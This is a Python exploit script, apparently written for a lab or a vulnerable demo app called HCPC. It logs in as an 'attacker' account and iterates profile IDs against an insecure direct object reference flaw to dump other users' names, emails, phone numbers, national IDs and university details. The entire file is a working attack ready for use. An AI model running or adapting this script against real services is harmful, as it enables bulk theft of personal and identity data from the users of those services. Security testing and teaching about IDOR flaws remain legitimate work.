#!/usr/bin/env python3
"""
HCPC IDOR Extraction Script (Python version)
Walks /api/profile/1 .. N and dumps all profiles.

Usage:
  python3 scripts/extract.py --email attacker@test.com --password 123456 --max 20
  python3 scripts/extract.py --email attacker@test.com --password 123456 --max 50 --out dump.json
"""
import argparse, json, sys
import requests

BASE = "http://localhost:5000"

def main():
    p = argparse.ArgumentParser(description="HCPC IDOR extractor")
    p.add_argument("--email", required=True, help="Attacker email (must be registered)")
    p.add_argument("--password", required=True)
    p.add_argument("--max", type=int, default=20, help="Max ID to try")
    p.add_argument("--out", help="Output JSON file")
    p.add_argument("--url", default=BASE, help="Base URL")
    args = p.parse_args()

    base = args.url.rstrip("/")
    s = requests.Session()

    # Login
    r = s.post(f"{base}/api/login", json={"email": args.email, "password": args.password})
    if not r.ok:
        print(f"[!] Login failed {r.status_code}: {r.text}"); sys.exit(1)
    j = r.json()
    print(f"[+] Logged in as {args.email} -> user #{j['id']}")
    print(f"[+] Walking {base}/api/profile/1 .. {args.max} (IDOR: no ownership check)\n")

    results=[]
    for i in range(1, args.max+1):
        r = s.get(f"{base}/api/profile/{i}")
        if r.ok:
            u=r.json()
            results.append(u)
            print(f"  [{i:3}] OK {u['first_name']} {u['last_name']} | {u['email']} | {u['phone']} | NID:{u['national_id']} | {u['university']} | {u['status']}")
        elif r.status_code==404:
            print(f"  [{i:3}] - not found")
        elif r.status_code==401:
            print(f"  [{i:3}] FAIL 401 Unauthorized"); break
        else:
            print(f"  [{i:3}] ? {r.status_code} {r.text[:120]}")

    print(f"\n[+] Done. Extracted {len(results)} profiles.")
    if args.out:
        open(args.out,"w").write(json.dumps(results, indent=2))
        print(f"[+] Dumped to {args.out}")
    elif results:
        print(json.dumps(results, indent=2))

if __name__=="__main__":
    main()
